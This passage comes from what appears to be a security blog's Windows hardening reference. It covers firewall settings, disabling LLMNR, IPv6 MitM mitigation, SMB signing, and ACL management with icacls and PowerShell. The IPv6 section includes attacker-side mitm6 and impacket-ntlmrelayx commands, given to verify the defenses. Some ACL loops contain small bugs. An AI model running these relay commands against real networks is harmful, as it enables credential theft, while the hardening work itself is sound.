this setting from within the GUI:</p> <ul> <li><code>Network &amp; Internet Settings &gt; Status &gt; Windows Firewall</code></li> <li>For all three, <code>Domain</code>, <code>Public</code>, <code>Private</code>:</li> <li>Set to <code>On</code></li> <li>Check <code>Blocks all incoming connections, including those on the list of allowed apps.</code></li> </ul> <p>To turn off this setting via the GUI: - Uncheck <code>Blocks all incoming connections, including those on the list of allowed apps.</code></p>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#llmnr","title":"LLMNR","text":"<p>https://www.blackhillsinfosec.com/how-to-disable-llmnr-why-you-want-to/</p> <p>Disable via GPO:</p> <ul> <li>Group Policy Management</li> <li>Forest: <code>&lt;DOMAIN&gt;.local</code> &gt; Domains &gt; <code>&lt;DOMAIN&gt;.local</code> &gt; <code>Right-Click</code></li> <li>Create a GPO in this domain, and Link it here...</li> <li>Name it \"LLMNR\" or something meaningful, click OK</li> <li>Computer Configuration &gt; Administrative Templates &gt; Network &gt; DNS Client</li> <li>Turn Off Multicast Name Resolution &gt; Enabled</li> <li><code>Right-Click</code> the policy name under <code>&lt;DOMAIN&gt;.local</code> and choose <code>Enforced</code></li> </ul> <p>You'll need to restart the endpoints, or refresh the group policy on each endpoint manually to ensure these changes take effect immediately</p> <p>Update Group Policy via PowerShell:</p> <pre><code>Get-ADComputer -filter * | foreach{ Invoke-GPUpdate -computer $_.name -RandomDelayInMinutes 0 -force}\n</code></pre> <p>Update Group Policy via cmd.exe:</p> <pre><code>gpupdate\n</code></pre> <p>Disable LLMNR via PowerShell:</p> <pre><code>If (!(Test-Path \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\DNSClient\")) {\n    New-Item -Path \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\DNSClient\" -Force | Out-Null\n}\nSet-ItemProperty -Path \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\DNSClient\" -Name \"EnableMulticast\" -Type DWord -Value 0\n</code></pre> <p>Disable LLMNR via cmd.exe:</p> <pre><code>REG ADD  \u201cHKLM\\Software\\policies\\Microsoft\\Windows NT\\DNSClient\u201d\nREG ADD  \u201cHKLM\\Software\\policies\\Microsoft\\Windows NT\\DNSClient\u201d /v \u201d EnableMulticast\u201d /t REG_DWORD /d \u201c0\u201d /f\n</code></pre>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#mitigate-ipv6-mitm-attacks","title":"Mitigate IPv6 MitM Attacks","text":"<p>https://academy.tcm-sec.com/p/practical-ethical-hacking-the-complete-course</p> <p>https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/</p> <p>https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/</p> <p>There are three predefined firewall rules to change from allow to block.</p> <p>This walks through setting these rules as a GPO on a Domain Controller, but you can create the same rules manually on endpoints via Windows Defender Firewall.</p> <p>Test these rules in an environment with ADCS configured by enabling them, updating Group Policy on each machine, then rebooting endpoints and signing in as a Domain Admin on any of them with mitm6 running. The attack(s) will no longer fire when these rules are in place.</p> <p>Here are the commands to run on the attacker machine:</p> <pre><code># In one terminal window:\nsudo /home/kali/.local/bin/mitm6 -i eth0 -v -d TESTDOMAIN.local\n# In another:\nimpacket-ntlmrelayx -6 -t ldaps://&lt;dc-ip&gt; -wh fakewpad.testdomain.local -l loot\n</code></pre> <ul> <li>Group Policy Management</li> <li>Forest: <code>&lt;DOMAIN&gt;.local</code> &gt; Domains &gt; <code>&lt;DOMAIN&gt;.local</code> &gt; <code>Right-Click</code></li> <li>Create a GPO in this domain, and Link it here...</li> <li>Name it \"IPv6\" or something meaningful, click OK Computer Configuration &gt; Windows Settings &gt; Security Settings &gt; Windows Defender Firewall with Advanced Security &gt; Windows Defender Firewall with Advanced Security &gt; [Inbound|Outbound] Rules</li> <li> <p>Create new custom rules for all three, there are usually none defined in Group Policy Management on the DC when defining a new GPO.</p> </li> <li> <p>(Inbound) Core Networking - Dynamic Host Configuration Protocol for IPv6(DHCPV6-IN)</p> <ul> <li>Name: Block - (DHCPV6-In)</li> <li>Protocol type: UDP</li> <li>Protocol number: 17</li> <li>Local Port: Specific Ports, 546</li> <li>Remote Port: Specific Ports, 547</li> <li>This program: %SystemRoot%\\system32\\svchost.exe</li> </ul> </li> <li> <p>(Inbound) Core Networking - Router Advertisement (ICMPv6-IN)</p> <ul> <li>Name: Block - Router Advertisement (ICMPv6-In)</li> <li>Protocol type: ICMPv6</li> <li>Protocol number: 58</li> <li>Local port: All Ports</li> <li>Remote port: All Ports</li> <li>Specific ICMP types: [x] Router Advertisement<ul> <li>ICMP Type: 0</li> <li>ICMP Code: Any</li> </ul> </li> <li>This program: System</li> </ul> </li> <li> <p>(Outbound) Core Networking - Dynamic Host Configuration Protocol for IPv6 (DHCPV6-Out)</p> <ul> <li>Name: Block - (DHCPV6-Out)</li> <li>Protocol type: UDP</li> <li>Protocol number: 17</li> <li>Local Port: Specific Ports, 546</li> <li>Remote Port: Specific Ports, 547</li> <li>This program: %SystemRoot%\\system32\\svchost.exe</li> </ul> </li> <li> <p><code>Right-Click</code> the policy name under <code>&lt;DOMAIN&gt;.local</code> and choose <code>Enforced</code></p> </li> </ul> <p>You'll need to restart the endpoints or refresh the group policy on each endpoint manually to ensure these changes take effect immediately</p> <p>Update Group Policy via PowerShell:</p> <pre><code>Get-ADComputer -filter * | foreach{ Invoke-GPUpdate -computer $_.name -RandomDelayInMinutes 0 -force}\n</code></pre> <p>Update Group Policy via cmd.exe:</p> <pre><code>gpupdate\n</code></pre>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#enable-smb-signing","title":"Enable SMB Signing","text":"<p>https://learn.microsoft.com/en-us/troubleshoot/windows-server/networking/overview-server-message-block-signing</p> <p>Default for Workstations = 0 Default for Server = 1</p> <p>Enable SMB Signing via PowerShell:</p> <pre><code>Set-ItemProperty -Path \"HKLM:\\System\\CurrentControlSet\\Services\\LanManWorkstation\\Parameters\" -Name \"RequireSecuritySignature\" -Type DWord -Value 1\nSet-ItemProperty -Path \"HKLM:\\System\\CurrentControlSet\\Services\\LanManServer\\Parameters\" -Name \"RequireSecuritySignature\" -Type DWord -Value 1\n</code></pre> <p>Enable SMB Signing on a Domain Controller via a GPO:</p> <ul> <li>Group Policy Management</li> <li>Forest: <code>&lt;DOMAIN&gt;.local</code> &gt; Domains &gt; <code>&lt;DOMAIN&gt;.local</code> &gt; <code>Right-Click</code></li> <li>Create a GPO in this domain, and Link it here...</li> <li>Name it \"SMB Signing\" or something meaningful, click OK</li> <li>Computer Configuration &gt; Policies &gt; Windows Settings &gt; Security Settings &gt; Local Policies &gt; Security Options</li> <li>Microsoft network server: Digitally sign communications (always) &gt; Enable</li> <li>Microsoft network client:  Digitally sign communications (always) &gt; Enable</li> <li><code>Right-Click</code> the policy name under <code>&lt;DOMAIN&gt;.local</code> and choose <code>Enforced</code></li> </ul> <p>You'll need to restart the endpoints or refresh the group policy on each endpoint manually to ensure these changes take effect immediately</p> <p>Update Group Policy via PowerShell:</p> <pre><code>Get-ADComputer -filter * | foreach{ Invoke-GPUpdate -computer $_.name -RandomDelayInMinutes 0 -force}\n</code></pre> <p>Update Group Policy via cmd.exe:</p> <pre><code>gpupdate\n</code></pre>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#filesystem","title":"Filesystem","text":"<p>How to do the equivalent of <code>chmod</code> operations in Windows.</p>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#takeownexe","title":"takeown.exe","text":"<p>Change ownership recursively of a file(s) or folder(s) to the current user:</p> <pre><code>takeown.exe /F .\\ExampleDir\\ /R\n</code></pre> <p>Change ownership recursively of a file(s) or folder(s) to the Administrators group:</p> <pre><code>takeown.exe /F .\\ExampleDir\\ /A /R\n</code></pre> <p>Change ownership back to a standard user (where $HOSTNAME is either local pc name or domain name, and user is a local or domain user):</p> <pre><code>takeown.exe /S $HOSTNAME /U $USER /F .\\ExampleDir\\\n</code></pre>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#icaclsexe","title":"icacls.exe","text":"<p>Remove all permissions on a file or folder:</p> <pre><code>icacls.exe .\\ExampleDir /inheritance:r\n</code></pre> <p>Reset to default permissions:</p> <pre><code>icacls.exe .\\ExampleDir\\ /reset\n</code></pre> <p>Folder Permissions</p> <p>Grant read-only access to a folder for user alice:</p> <pre><code>icacls.exe .\\ExampleDir\\ /grant alice:\"(CI)(OI)RX\"\n</code></pre> <p>Remove granted (note the <code>:g</code>) access to a *folder for user alice:</p> <pre><code>icacls.exe .\\ExampleDir\\ /remove:g alice\n</code></pre> <p>Permit read-only access to a folder for the builtin group \"everyone\" (removes any inherit or current write or modify permissions with <code>/inheritance:r</code>):</p> <ul> <li>SID <code>*S-1-1-0</code> means <code>everyone</code></li> <li>Similar to <code>chmod a=rX -R ./ExampleFolder</code> in Linux</li> </ul> <pre><code>icacls.exe .\\ExampleDir\\ /inheritance:r\nicacls.exe .\\ExampleDir\\ /grant *S-1-1-0:\"(CI)(OI)RX\"\n</code></pre> <p>The purpose of <code>CI</code> and <code>OI</code> is to allow the \"synchronize\" permission, which allows directory traversal and if missing, denies it even if RX permission is granted</p> <p>Configure a folder to be only modifiable by administrators, read and execute by eveyrone:</p> <ul> <li>Similar to <code>chmod a=rX -R ./ExampleFolder; chmod o=rwX -R ./ExampleFolder; chown root:root ./ExmapleFolder</code> on Linux</li> </ul> <pre><code>icacls.exe C:\\Tools /inheritance:r\nicacls.exe C:\\Tools /grant *S-1-1-0:\"(CI)(OI)RX\"\nicacls.exe C:\\Tools /grant SYSTEM:\"(CI)(OI)(F)\"\nicacls.exe C:\\Tools /grant BUILTIN\\Administrators:\"(CI)(OI)(F)\"\n</code></pre> <p>Example output:</p> <pre><code>PS&gt; icacls.exe C:\\Tools\\*\nC:\\Tools Everyone:(OI)(CI)(RX)\n         NT AUTHORITY\\SYSTEM:(OI)(CI)(F)\n         BUILTIN\\Administrators:(OI)(CI)(F)\n</code></pre> <p>File Permissions</p> <p>Grant read-only access to a file for user alice. This does not require <code>(CI)(OI)</code>:</p> <pre><code>icacls.exe .\\ExampleFile /grant alice:\"RX\"\n</code></pre> <p>Remove granted (note the <code>:g</code>) access to a file for user alice:</p> <pre><code>icacls.exe .\\ExampleFile /remove:g alice\n</code></pre> <p>Permit read-only + execute for the <code>everyone</code> builtin group, to a single file. This does not require <code>(CI)(OI)</code>:</p> <pre><code>icacle.exe .\\example.md /inheritance:r /grant *S-1-1-0:\"RX\"\n</code></pre> <p>Limit full access to only SYSTEM and BUILTIN\\Administrators:</p> <pre><code>icacls.exe .\\administrators_authorized_keys /inheritance:r\nicacls.exe .\\administrators_authorized_keys /grant SYSTEM:\"(F)\"\nicacls.exe .\\administrators_authorized_keys /grant BUILTIN\\Administrators:\"(F)\"\n</code></pre> <p>Example output:</p> <pre><code>PS&gt; icacls.exe .\\administrators_authorized_keys\nadministrators_authorized_keys NT AUTHORITY\\SYSTEM:(F)\n                               BUILTIN\\Administrators:(F)\n</code></pre>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#net-access-control-methods","title":".NET Access Control Methods","text":"<p>This section breaks down using the PowerShell <code>Set/Get-Acl</code> cmdlets and the .NET methods underpinning them. The idea is to mirror what <code>takeown.exe</code> and <code>icacls.exe</code> or <code>chmod</code> plus <code>chown</code> can do, in an easy to understand way.</p> <p>Take the ACL data of one filesystem object and apply it to another with the following:</p> <pre><code>$SourceObject = \"C:\\Users\\Administrator\\Documents\"\n$NewAcl = Get-Acl -Path $SourceObject\n$DestObject = \"C:\\Tools\"\nSet-Acl -Path $DestObject -AclObject $NewAcl\n</code></pre> <p>To use this like <code>icacls.exe</code> or <code>chmod</code> we'll need to reference some examples:</p> <ul> <li><code>Set-Acl</code></li> <li><code>FileSystemAccessRule($identity, $fileSystemRights, $type)</code></li> </ul> <p>First, to learn the namespace / class path to access .NET classes, see the top Definition section of each class in the documentation:</p> <p>FileSecurity Class</p> <p>Namespace: System.Security.AccessControl</p> <p>Access it with: <code>New-Object -TypeName System.Security.AccessControl.FileSecurity -ArgumentList ...&lt;SNIP&gt;</code></p> <p>Remember: Methods apply actions, where classes define the objects or \"things\" to work with through actions, roughly speaking.</p> <p>Looking at the five parameters to <code>FileSystemAccessRule($identity, $fileSystemRights, $inheritanceFlags, $propagationFlags, $type)</code>, shows how we can start to write the code block.</p> <p>$identity</p> <p><code>$identity</code> is a reference to a user account through the NTAccount class, built with either a <code>$userAccount</code> string, or both a <code>$domainName</code> and <code>$userAccount</code> string.</p> <p>$fileSystemRights</p> <p>For the fields available to <code>$fileSystemRights</code>, these include but aren't limited to:</p> <ul> <li>FullControl</li> <li>Read</li> <li>Write</li> <li>Modify</li> <li>Synchronize</li> <li>Traverse</li> </ul> <p>You can specify more than one <code>$fileSystemRights</code> with a comma separated list. So we can create a FileSystemAccessRule construct like this:</p> <pre><code>$AccessRule = New-Object -TypeName System.Security.AccessControl.FileSystemAccessRule -ArgumentList $UserName,\"ReadAndExecute,Modify\",\"Allow\"\n</code></pre> <p>For the sake of readability, many examples below use one per line.</p> <p>$inheritanceFlags, $propagationFlags</p> <p><code>$inheritanceFlags</code> and <code>$propagationFlags</code> define how existing child objects are modified based on the parent ACL.</p> <ul> <li><code>$inheritanceFlags</code> of <code>\"ContainerInherit,ObjectInherit\"</code> is the same as <code>\"(CI)(OI)\"</code> from icacls.exe, meaning the changes are recursive and persistent</li> <li><code>$propagationFlags</code> should be set to <code>\"None\"</code> if the \"root\" object removed existing inheritance from its parent object and has its own ACL's protected</li> </ul> <p>$type</p> <p><code>$type</code> is either <code>Allow</code> (0) or <code>Deny</code> (1).</p> <p>Inheritance</p> <p>Of all the methods under the object security class, <code>SetAccessRuleProtection</code> appears to deal directly with inheritance. Inheritance complicates locking down ACL's in some cases. This is a way to work with that.</p> <p>Essential Methods</p> <p>Now for reference, lets list all the relevant methods under the <code>FileSystemSecurity</code> and <code>ObjectSecurity</code> class in a way that's more readable and understandable.</p> <ul> <li><code>SetAccessRule($rule)</code> Where <code>$rule</code> is an ACL object built from <code>FileSystemAccessRule()</code> to apply</li> <li><code>RemoveAccessRule($rule)</code> Where <code>$rule</code> is an ACL object built from <code>FileSystemAccessRule()</code> to remove</li> <li><code>PurgeAccessRules($identity)</code> Which purges all of <code>$identity</code>'s access to an object</li> <li><code>SetOwner($identity)</code> Sets the owner to <code>$identity</code></li> <li><code>SetGroup($identity)</code> Sets the group to <code>$identity</code></li> <li><code>SetAccessRuleProtection($true, $false)</code> Protects our defined rules from inheritance, and removes existing inheritance</li> <li><code>NTAccount($domainName, $accountName)</code> Is how you construct an <code>$identity</code> object, <code>$domainName</code> is optional</li> </ul> <p>Finally, when do you use Set/Add/Remove/Purge?</p> <ul> <li>Use <code>SetAccessRule()</code> to overwrite, and replace a specifc <code>$identity</code>'s ACL for an object</li> <li>Use <code>AddAccessRule()</code> to build on an <code>$identity</code>'s existing ACL for an object, like \"set\" the first rule, then \"add\" additional rules</li> <li>Use <code>RemoveAccessRule()</code> to remove a <code>$rule</code> from an <code>$identity</code>'s ACL, like take away FullControl, but leave all other existing rules</li> <li>Use <code>PurgeAccessRules()</code> to completely remove any defined <code>$rule</code>s for an <code>$identity</code>, this does not prevent access via inheritance</li> </ul> <p>Next, some practical examples of how to use these. Each of them is copy / paste ready to use, just change the top variables.</p> <p>Reset ACL to Default Inheritance</p> <ul> <li>This effectively wipes any modifications</li> <li>Meaning the filesystem object will default to the ACL's it's going to inherit based on where it exists in the filesystem</li> <li>This uses the first constructor example in the FileSecurity class to create an empty FileSecurity object, and apply it to the <code>$FilePath</code></li> </ul> <pre><code>$FilePath = \"test.txt\"\n$EmptyAcl = New-Object -TypeName System.Security.AccessControl.FileSecurity -ArgumentList $null\nSet-Acl -Path $FilePath -AclObject $EmptyAcl\nGet-Acl -Path $FilePath | fl\n</code></pre> <p>Change Ownership</p> <ul> <li>Gives \"User2\" ownership of <code>$FilePath</code></li> <li>Just change the value of <code>$UserAccount</code> to any user to change ownership</li> <li>Builds a <code>System.Security.Principal.NTAccount</code> object for <code>$identity</code></li> <li>Uses <code>SetOwner($identity)</code></li> </ul> <pre><code>$FilePath = \"test.txt\"\n$UserAccount = \"User2\"\n$NewAcl = Get-Acl -Path $FilePath\n$NewOwner = New-Object -TypeName System.Security.Principal.NTAccount -ArgumentList $UserAccount\n$NewAcl.SetOwner($NewOwner)\nSet-Acl -Path $FilePath -AclObject $NewAcl\nGet-Acl -Path $FilePath | fl\n</code></pre> <p>Set Access</p> <ul> <li>This adds User2 to the ACL, with the FullControl right over <code>$FilePath</code></li> <li>In this case User2 had no previous ACL rules defined or access to <code>$FilePath</code></li> <li>Uses <code>SetAccessRule($rule)</code></li> </ul> <pre><code>$FilePath = \"test.txt\"\n$UserName = \"User2\"\n$NewAcl = Get-Acl -Path $FilePath\n$AccessRule = New-Object -TypeName System.Security.AccessControl.FileSystemAccessRule -ArgumentList $UserName,\"FullControl\",\"Allow\"\n$NewAcl.SetAccessRule($AccessRule)\nSet-Acl -Path $FilePath -AclObject $NewAcl\nGet-Acl -Path $FilePath | fl\n</code></pre> <p>Add Access</p> <ul> <li>If an <code>$identity</code> alread has a defined ACL for the object, add another <code>$fileSystemRights</code> rule definition to it</li> <li>Similar to <code>SetAccessRule()</code>, but appends the rule to existing access</li> <li>Uses <code>AddAccessRule($rule)</code></li> </ul> <p>You could also use this in addition to <code>SetAccessRule()</code> when building specific rules for an <code>$identity</code> even when creating new rules. Otherwise each invocation of <code>SetAccessRule()</code> overwrites the previous list for the same <code>$identity</code>. The example below demonstrates this.</p> <pre><code>$FilePath = \"C:\\Tools\"\n$UserName = \"User2\"\n$NewAcl = Get-Acl -Path $FilePath\n$AccessRule1 = New-Object -TypeName System.Security.AccessControl.FileSystemAccessRule -ArgumentList $UserName,\"ReadAndExecute\",\"Allow\"\n$AccessRule2 = New-Object -TypeName System.Security.AccessControl.FileSystemAccessRule -ArgumentList $UserName,\"CreateFiles\",\"Allow\"\n$AccessRule3 = New-Object -TypeName System.Security.AccessControl.FileSystemAccessRule -ArgumentList $UserName,\"CreateDirectories\",\"Allow\"\n$AccessRule4 = New-Object -TypeName System.Security.AccessControl.FileSystemAccessRule -ArgumentList $UserName,\"Synchronize\",\"Allow\"\n$NewAcl.SetAccessRule($AccessRule1)\n$NewAcl.AddAccessRule($AccessRule2)\n$NewAcl.AddAccessRule($AccessRule3)\n$NewAcl.AddAccessRule($AccessRule4)\nSet-Acl -Path $FilePath -AclObject $NewAcl\nGet-Acl -Path $FilePath | fl\n</code></pre> <p>Remove Access</p> <ul> <li>Same as <code>AddAccessRule($rule)</code>, only it removes an existing <code>$fileSystemRights</code> rule definition</li> <li>This can be one rule, or any number of rules defined for any <code>$identity</code></li> </ul> <pre><code>$FilePath = \"C:\\Tools\"\n$UserName = \"User2\"\n$NewAcl = Get-Acl -Path $FilePath\n$AccessRule1 = New-Object -TypeName System.Security.AccessControl.FileSystemAccessRule -ArgumentList $UserName,\"AppendData\",\"Allow\"\n$AccessRule2 = New-Object -TypeName System.Security.AccessControl.FileSystemAccessRule -ArgumentList $UserName,\"CreateFiles\",\"Allow\"\n$NewAcl.RemoveAccessRule($AccessRule1)\n$NewAcl.RemoveAccessRule($AccessRule2)\nSet-Acl -Path $FilePath -AclObject $NewAcl\nGet-Acl -Path $FilePath | fl\n</code></pre> <p>Purge Access / Remove All</p> <ul> <li>This revokes User2's defined ACL's to the file. User2 may still access the file through inheritance, however.</li> <li>Uses <code>PurgeAccessRules($identity)</code></li> <li><code>RemoveAccessRuleAll($rule)</code> appears to do the same thing, just specify one existing rule and all will be wiped for that <code>$identity</code></li> </ul> <pre><code>$FilePath = \"test.txt\"\n$UserAccount = \"User2\"\n$NewAcl = Get-Acl -Path $FilePath\n$RemoveAccount = New-Object -TypeName System.Security.Principal.NTAccount -ArgumentList $UserAccount\n$NewAcl.PurgeAccessRules($RemoveAccount)\nSet-Acl -Path $FilePath -AclObject $NewAcl\nGet-Acl -Path $FilePath | fl\n</code></pre> <p>Admin RWX, Users RX</p> <p>This is effectively the <code>/usr/bin</code> permissions of 755 where only elevated accounts can modify content, but everyone can read and execute it.</p> <ul> <li>Resets the ACL for the path recursively, and applies the 0755 style permissions to it</li> <li>The new ACL must be applied to all existing files recursively</li> <li>Just because an Administrator makes a directory does NOT mean standard users cannot modify it</li> <li>You must disable inheritance, and set explicit permissions for such folders</li> <li>Owner  : BUILTIN\\Administrators</li> <li>Access : BUILTIN\\Administrators Allow  FullControl</li> <li>Access : NT AUTHORITY\\SYSTEM Allow  FullControl</li> <li>Access : Everyone Allow  ReadAndExecute, Synchronize</li> </ul> <pre><code>$FilePath = \"C:\\Tools\"\n$UserName = \"BUILTIN\\Administrators\"\n# Reset the ACL\n$EmptyAcl = New-Object -TypeName System.Security.AccessControl.FileSecurity -ArgumentList $null\nSet-Acl -Path $FilePath -AclObject $EmptyAcl\nforeach ($item in (gci -Recurse -Force $FilePath)) {\n    Set-Acl -Path $FilePath -AclObject $EmptyAcl\n}\n# Construct the new ACL\n$NewAcl = Get-Acl -Path $FilePath\n$AccessRule1 = New-Object -TypeName System.Security.AccessControl.FileSystemAccessRule -ArgumentList $UserName,\"FullControl\",\"ContainerInherit,ObjectInherit\",\"None\",\"Allow\"\n$AccessRule2 = New-Object -TypeName System.Security.AccessControl.FileSystemAccessRule -ArgumentList \"NT AUTHORITY\\SYSTEM\",\"FullControl\",\"ContainerInherit,ObjectInherit\",\"None\",\"Allow\"\n$AccessRule3 = New-Object -TypeName System.Security.AccessControl.FileSystemAccessRule -ArgumentList \"Everyone\",\"ReadAndExecute,Synchronize\",\"ContainerInherit,ObjectInherit\",\"None\",\"Allow\"\n$NewOwner = New-Object -TypeName System.Security.Principal.NTAccount -ArgumentList \"$UserName\"\n$NewAcl.SetAccessRule($AccessRule1)\n$NewAcl.SetAccessRule($AccessRule2)\n$NewAcl.SetAccessRule($AccessRule3)\n$NewAcl.SetAccessRuleProtection($true, $false)\n$NewAcl.SetOwner($NewOwner)\nSet-Acl -Path $FilePath -AclObject $NewAcl\nforeach ($item in (gci -Recurse -Force $FilePath)) {\n    Set-Acl -Path $FilePath -AclObject $NewAcl\n}\nGet-Acl -Path $FilePath | fl\n</code></pre> <p>Admin Only</p> <p>Creates a file / folder permission structure where only Admins can traverse and modify the content.</p> <ul> <li>Like before, you must apply the constructed ACL object to all existing files recursively</li> </ul> <pre><code>$FilePath = \"C:\\Tools\"\n$UserName = \"BUILTIN\\Administrators\"\n# Reset the ACL recursively\n$EmptyAcl = New-Object -TypeName System.Security.AccessControl.FileSecurity -ArgumentList $null\nSet-Acl -Path $FilePath -AclObject $EmptyAcl\nforeach ($item in (gci -Recurse -Force $FilePath)) {\n    Set-Acl -Path $FilePath -AclObject $EmptyAcl\n}\n# Construct the new ACL, apply it recursively\n$NewAcl = Get-Acl -Path $FilePath\n$AccessRule1 = New-Object -TypeName System.Security.AccessControl.FileSystemAccessRule -ArgumentList $UserName,\"FullControl\",\"ContainerInherit,ObjectInherit\",\"None\",\"Allow\"\n$AccessRule2 = New-Object -TypeName System.Security.AccessControl.FileSystemAccessRule -ArgumentList \"NT AUTHORITY\\SYSTEM\",\"FullControl\",\"ContainerInherit,ObjectInherit\",\"None\",\"Allow\"\n$NewOwner = New-Object -TypeName System.Security.Principal.NTAccount -ArgumentList \"$UserName\"\n$NewAcl.SetAccessRule($AccessRule1)\n$NewAcl.SetAccessRule($AccessRule2)\n$NewAcl.SetAccessRuleProtection($true, $false)\n$NewAcl.SetOwner($NewOwner)\nSet-Acl -Path $FilePath -AclObject $NewAcl\nforeach ($item in (gci -Recurse -Force $FilePath)) {\n    Set-Acl -Path $FilePath -AclObject $NewAcl\n}\nGet-Acl -Path $FilePath | fl\n</code></pre> <p>Set User's authorized_keys Permissions</p> <p>Three PowerShell utilities exist in the PowerShell/openssh-portable repo addressing this issue:</p> <ul> <li>OpenSSHUtils.psm1</li> <li>FixHostFilePermissions.ps1</li> <li>FixUserFilePermissions.ps1</li> </ul> <p>This is a simplified version of what those achieve, to help you understand how to do this yourself.</p> <ul> <li>Wipes out all existing ACLs and removes inheritance</li> <li>Allows <code>$env:USERNAME</code> (and NT AUTHORITY\\SYSTEM + BUILTIN\\Administrators) FullControl over <code>authorized_keys</code></li> </ul> <pre><code>$UserName = $env:USERNAME # Replace this with a defined user\n$FilePath = \"C:\\Users\\$UserName\\.ssh\\authorized_keys\"\n# Reset the ACL\n$EmptyAcl = New-Object -TypeName System.Security.AccessControl.FileSecurity -ArgumentList $null\nSet-Acl -Path $FilePath -AclObject $EmptyAcl\n# Construct the new ACL\n$NewAcl = Get-Acl -Path $FilePath\n$AccessRule1 = New-Object -TypeName System.Security.AccessControl.FileSystemAccessRule -ArgumentList $UserName,\"FullControl\",\"Allow\"\n$AccessRule2 = New-Object -TypeName System.Security.AccessControl.FileSystemAccessRule -ArgumentList \"NT AUTHORITY\\SYSTEM\",\"FullControl\",\"Allow\"\n$AccessRule3 = New-Object -TypeName System.Security.AccessControl.FileSystemAccessRule -ArgumentList \"BUILTIN\\Administrators\",\"FullControl\",\"Allow\"\n$NewOwner = New-Object -TypeName System.Security.Principal.NTAccount -ArgumentList \"$UserName\"\n$NewAcl.SetAccessRule($AccessRule1)\n$NewAcl.SetAccessRule($AccessRule2)\n$NewAcl.SetAccessRule($AccessRule3)\n$NewAcl.SetAccessRuleProtection($true, $false)\n$NewAcl.SetOwner($NewOwner)\nSet-Acl -Path $FilePath -AclObject $NewAcl\nGet-Acl -Path $FilePath | fl\n</code></pre> <p>Set administrators_authorized_keys Permissions</p> <p>Same as the authorized_keys file permissions for a standard user, except NT AUTHORITY\\SYSTEM and BUILTIN\\Administrators are the only <code>$identity</code>s that can access the file.</p> <pre><code>$FilePath = \"C:\\ProgramData\\ssh\\administrators_authorized_keys\"\n# Reset the ACL\n$EmptyAcl = New-Object -TypeName System.Security.AccessControl.FileSecurity -ArgumentList $null\nSet-Acl -Path $FilePath -AclObject $EmptyAcl\n# Construct the new ACL\n$NewAcl = Get-Acl -Path $FilePath\n$AccessRule1 = New-Object -TypeName System.Security.AccessControl.FileSystemAccessRule -ArgumentList \"NT AUTHORITY\\SYSTEM\",\"FullControl\",\"Allow\"\n$AccessRule2 = New-Object -TypeName System.Security.AccessControl.FileSystemAccessRule -ArgumentList \"BUILTIN\\Administrators\",\"FullControl\",\"Allow\"\n$NewOwner = New-Object -TypeName System.Security.Principal.NTAccount -ArgumentList \"BUILTIN\\Administrators\"\n$NewAcl.SetAccessRule($AccessRule1)\n$NewAcl.SetAccessRule($AccessRule2)\n$NewAcl.SetAccessRuleProtection($true, $false)\n$NewAcl.SetOwner($NewOwner)\nSet-Acl -Path $FilePath -AclObject $NewAcl\nGet-Acl -Path $FilePath | fl\n</code></pre>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#net-access-audit-methods","title":".NET Access Audit Methods","text":"<p>Much like ACL's, we can build and apply audit rules via PowerShell in a similar way.</p> <p>See the <code>SetAuditRule($rule)</code> method.</p> <pre><code># TO DO\n</code></pre>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#smb","title":"SMB","text":"<p>This section references the following sources:</p> <ul> <li>nemo-wq/PrintNightmare</li> <li>Set-Acl</li> <li>New-SmbShare</li> </ul> <p>Create a new folder, an SMB share for that folder, and give <code>flare-user</code> full access to it:</p> <pre><code># Setup a user to access the folder\n$Password = ConvertTo-SecureString \"flare-pass\" -AsPlainText -Force\nNew-LocalUser \"flare-user\" -Password $Password\nAdd-LocalGroupMember -Group \"Users\" -Member \"flare-user\"\n\n# Create the folder\nNew-Item -Type Directory -Path C:\\Share\n\n# Give flare-user FullControl\n$NewAcl = Get-Acl -Path \"C:\\Share\"\n$identity = \"[DOMAIN\\]flare-user\"\n$fileSystemRights = \"FullControl\"\n$type = \"Allow\"\n$argumentlist = $identity, $fileSystemRights, $type\n$NewRule = New-Object -TypeName System.Security.AccessControl.FileSystemAccessRule -ArgumentList $argumentlist\n$NewAcl.SetAccessRule($NewRule)\nSet-Acl -Path \"C:\\Share\" -AclObject $NewAcl\n\n# Create the share\nNew-SmbShare -Path C:\\Share -Name \"Share\" -FullAccess \"flare-user\"\n\n# Check available shares\nGet-SmbShare -Name *\n</code></pre> <p>NOTE 1: You can tab complete difficult to remember arguments like <code>System.Security.AccessControl.FileSystemAccessRule</code>.</p> <p>NOTE 2: ChatGPT May 24 Version demonstrates a shorter way of writing the <code>$NewRule</code> line:</p> <pre><code>$NewRule = New-Object -TypeName System.Security.AccessControl.FileSystemAccessRule(\"flare-user\", \"FullControl\", \"Allow\")\n</code></pre> <p>From here you can easily <code>impacket-smbclient flare-user:flare-pass@hostname</code> to connect.</p> <p>Modifying access to a share is done with the following cmdlets:</p> <ul> <li><code>Grant-SmbShareAccess</code></li> <li><code>Revoke-SmbShareAccess</code></li> </ul> <p>Remove an SMB share:</p> <pre><code>Remove-SmbShare -Name \"Share\"\n</code></pre>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#sysinternals","title":"SysInternals","text":"<p>Overview:</p> <p>https://docs.microsoft.com/en-us/sysinternals/</p> <p>Download individual tools directly:</p> <p>https://live.sysinternals.com/</p> <p>Download the entire suite as a zip archive:</p> <p>https://download.sysinternals.com/files/SysinternalsSuite.zip</p>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#accesschk","title":"AccessChk","text":"<ul> <li>https://live.sysinternals.com/accesschk64.exe</li> <li>https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk</li> </ul> <p>See the following blog for additional uses of AccessChk: - https://sirensecurity.io/blog/windows-privilege-escalation-resources/</p> 